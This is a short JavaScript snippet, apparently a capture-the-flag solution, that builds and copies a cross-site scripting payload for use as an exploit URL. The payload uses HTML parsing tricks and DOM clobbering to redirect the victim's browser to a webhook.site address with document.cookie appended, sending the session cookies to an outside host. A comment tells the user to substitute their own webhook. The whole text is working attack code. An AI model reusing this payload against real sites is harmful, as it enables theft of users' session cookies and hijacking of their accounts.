// run this in browser console to get exploit url
ht = `<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>`
copy(ht)
// need to change the webhook url to your own
